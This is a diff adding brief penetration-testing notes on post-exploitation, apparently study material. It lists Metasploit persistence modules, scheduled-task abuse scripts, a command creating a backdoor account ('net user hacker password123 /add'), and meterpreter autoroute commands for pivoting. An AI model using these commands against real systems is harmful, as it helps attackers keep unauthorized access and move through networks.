@@ -1,0 +1,25 @@
+Persistence
+
+    Scripts
+
+        Metasploit:
+            - run persistence -h
+            - exploit/windows/local/persistence
+            - exploit/windows/local/registry_persistence
+
+        Scheduled Tasks
+            - run scheduleme
+            - run schtaskabuse
+
+        Add a user
+            - net user hacker password123 /add
+
+Pivoting
+
+    Use ipconfig to see any other connections.
+
+    Then, we can try to run autoroute with meterpreter.
+        - "run autoroute -s <ip of interest>/24"
+        - "run autoroute -p"
+            * this will list all possible routes.
+
